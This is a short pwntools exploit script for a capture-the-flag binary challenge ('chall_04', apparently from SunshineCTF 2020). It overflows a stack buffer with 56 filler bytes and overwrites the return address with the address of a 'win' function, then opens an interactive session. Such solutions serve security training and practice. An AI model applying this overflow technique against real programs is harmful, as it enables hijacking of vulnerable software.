#!/usr/bin/env python3

from pwn import *

context.binary = ELF('./chall_04')

if args.REMOTE:
    io = remote('chal.2020.sunshinectf.org', 30004)
else:
    io = process(context.binary.path)

print(io.recvline())
io.sendline('throwaway')

buffer = 'A' * 56
payload = p64(0x04005b7) # address of win function

exploit = flat(buffer, payload)
print("Sending: ", exploit)
io.sendline(exploit)

io.interactive()
